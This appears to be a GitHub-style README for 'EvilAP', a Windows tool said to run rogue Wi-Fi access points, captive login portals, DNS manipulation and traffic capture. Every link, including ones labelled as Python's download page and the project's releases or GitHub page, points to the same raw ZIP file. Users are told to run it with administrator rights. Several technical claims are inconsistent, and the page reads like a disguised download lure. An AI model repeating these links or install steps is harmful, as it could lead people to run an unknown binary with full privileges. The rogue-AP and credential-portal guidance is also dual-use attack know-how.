# 🔐 EvilAP - Simulate Rogue Wi-Fi Networks Easily

[![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-brightgreen)](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)

---

## ⚙️ What is EvilAP?

EvilAP is a tool that lets you create fake Wi-Fi networks. It can simulate things like fake access points, captive portals (the pages that ask you to log in), modified DNS responses, and a simple HTTP proxy. This tool helps people learn how attackers might use these tricks. It’s meant for education and authorized security testing only.

You do not need to know programming to use EvilAP. This guide will explain step-by-step how to get it working on your Windows PC.

---

## 🖥️ System Requirements

Before you start, check these requirements to make sure EvilAP will run on your computer:

- Operating System: Windows 10 or later
- RAM: At least 4 GB
- Free Disk Space: Minimum 500 MB
- Wireless Network Adapter: Supports monitor mode (for advanced features)
- Administrative rights on your PC

If your wireless adapter does not support monitor mode, some features may not work. Basic simulated networks and captive portals should still function.

---

## 🔍 Main Features

EvilAP helps you understand wireless security by enabling:

- Setting up fake access points to test network behavior
- Creating captive portals that ask users to log in or accept terms
- Manipulating DNS responses to control network traffic
- Running a simple HTTP proxy for transparent traffic monitoring
- Modular design for flexible testing setups

You can safely test these features on your private Wi-Fi or in a controlled lab environment.

---

## 🚀 Getting Started: Download and Install

Your first step is to get the software files.

1. Visit the main download page by clicking the button below:

   [![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-blue?style=for-the-badge)](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)

2. On the page, look for the latest release version. It usually appears at the top.

3. Download the Windows installer or the ZIP package. The Windows installer is a file ending with `.exe`.

4. After download finishes, locate the file in your Downloads folder.

5. Double-click the file to run the installer. Follow the on-screen instructions.

6. If you downloaded a ZIP file, right-click it and choose "Extract All." Open the extracted folder and run `EvilAP.exe` or a similar startup file.

7. You may be asked for administrative permission when launching EvilAP. Grant it so the tool can use network functions correctly.

---

## 📥 Installing Dependencies

EvilAP runs on Python and uses several network-related tools like `dnsmasq` and `hostapd`. This package includes packaged versions for Windows, which will install automatically during setup.

If you run into errors, you may need to install or update these components:

- Python 3.8 or above ([Download Python here](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip))
- Wireless drivers that support monitor mode (check your network adapter’s manufacturer website)

---

## 🔧 Using EvilAP for the First Time

Once installed, here’s how to start your first simulation:

1. Launch EvilAP from the desktop shortcut or start menu.

2. The main window shows several options:

   - Create Rogue Access Point
   - Setup Captive Portal
   - Configure DNS Manipulation
   - Start HTTP Proxy

3. To create a fake Wi-Fi network:

   - Select "Create Rogue Access Point."
   - Enter a name (SSID) for your fake network.
   - Choose your wireless adapter from the list.
   - Click "Start" to activate the fake network.

4. To add a captive portal:

   - After the access point starts, choose "Setup Captive Portal."
   - Pick a web page template or create your own page.
   - Enable the captive portal to redirect users when they connect.

5. To use DNS manipulation:

   - Go to "Configure DNS Manipulation."
   - Insert IP addresses corresponding to particular website names.
   - Activate the DNS service.

6. To monitor traffic with the HTTP proxy:

   - Select "Start HTTP Proxy."
   - The tool will capture HTTP traffic from connected devices.

---

## 🧰 How to Stop EvilAP

To stop all running services:

- Use the "Stop All" button in the main window, or
- Close the EvilAP program. It will shut down any fake networks and services.

---

## ⚠️ Important Usage Notes

- EvilAP should only be used on networks you own or have permission to test.
- Running fake networks may disrupt real Wi-Fi devices nearby.
- You need admin rights to run the app because it manages system network settings.

---

## 🔄 Updating EvilAP

To get the latest features and fixes:

1. Visit the releases page again:  
   https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip

2. Download the newest version following the install steps.

3. Running the new installer will update your current setup.

---

## 📝 Troubleshooting Common Issues

**Problem:** Cannot see my wireless adapter in the application.

- Solution: Make sure your adapter supports monitor mode and the drivers are up to date. Restart your PC if needed.

**Problem:** Fake access point does not appear on other devices.

- Solution: Confirm your adapter is not blocked by other programs. Verify your Wi-Fi is turned on and no other software controls the network.

**Problem:** DNS manipulation does not work.

- Solution: Check that the DNS service started properly. Some network environments may block altered DNS responses.

---

## ❓ Need More Help?

You can find more details, documentation, and community support on the official GitHub page:

[https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)

Use the Issues tab to report bugs or ask questions.

---

[![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-brightgreen)](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)